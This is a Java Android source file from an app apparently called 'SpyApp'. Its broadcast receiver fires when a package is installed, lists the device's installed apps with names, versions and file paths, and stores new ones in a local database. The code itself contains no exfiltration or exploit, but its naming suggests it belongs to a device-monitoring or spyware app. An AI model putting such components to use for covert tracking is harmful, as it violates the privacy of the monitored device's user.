package com.app.spyapp.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.net.Uri;

import com.app.spyapp.SpyApp;
import com.app.spyapp.model.InstallAppModel;

import java.util.ArrayList;
import java.util.List;


public class ApplicationAddReceiver extends BroadcastReceiver {
    private SpyApp spyApp;

    @Override
    public void onReceive(Context context, Intent intent) {
        final String action = intent.getAction();
        spyApp = (SpyApp) context.getApplicationContext();

        if (action.equals(Intent.ACTION_PACKAGE_ADDED)) {
            ArrayList<InstallAppModel> installAppList = getInstalledApps(false, context);
            if (installAppList != null && installAppList.size() > 0) {
                for (int i = 0; i < installAppList.size(); i++) {
                    InstallAppModel installAppModel = installAppList.get(i);
                    if (!spyApp.getDatabaseHelper().isAppExits(installAppModel.getPackageName())) {
                        spyApp.getDatabaseHelper().insertApp(installAppModel);
                    }
                }
            }
        }
    }

    private ArrayList<InstallAppModel> getInstalledApps(boolean getSysPackages, Context context) {
        ArrayList<InstallAppModel> installAppList = new ArrayList<InstallAppModel>();
        List<PackageInfo> packs = context.getPackageManager().getInstalledPackages(0);
        for (int i = 0; i < packs.size(); i++) {
            PackageInfo p = packs.get(i);
            if ((!getSysPackages) && (p.versionName == null)) {
                continue;
            }
            InstallAppModel newInfo = new InstallAppModel();
            newInfo.setAppname(p.applicationInfo.loadLabel(context.getPackageManager()).toString());
            newInfo.setPackageName(p.packageName);
            newInfo.setVersionName(p.versionName);
            newInfo.setVersioncode(p.versionCode);
            newInfo.setSourceDirectory(p.applicationInfo.sourceDir);
            installAppList.add(newInfo);
        }
        return installAppList;
    }
}
